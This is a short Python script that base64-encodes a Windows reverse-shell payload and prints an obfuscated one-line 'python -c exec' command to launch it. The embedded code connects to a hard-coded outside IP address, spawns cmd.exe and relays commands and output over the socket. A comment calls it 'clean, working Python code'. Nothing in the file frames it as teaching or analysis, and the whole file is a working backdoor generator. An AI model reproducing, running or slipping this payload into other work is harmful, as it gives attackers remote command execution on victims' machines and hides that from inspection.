import base64

# Your clean, working Python code
raw_code = """import socket,subprocess,threading
s=socket.socket()
s.connect(('26.106.250.206',1234))
p=subprocess.Popen(['cmd.exe'],stdin=-1,stdout=-1,stderr=-1,shell=True)
def t(o,s):
 while True:
  d=o.read1(1024)
  if not d:break
  s.send(d)
threading.Thread(target=t,args=(p.stdout,s),daemon=True).start()
while True:
 d=s.recv(1024)
 if not d:break
 p.stdin.write(d+b'\\n')
 p.stdin.flush()"""

encoded = base64.b64encode(raw_code.encode()).decode()
print(f"python -c \"import base64;exec(base64.b64decode('{encoded}'))\"")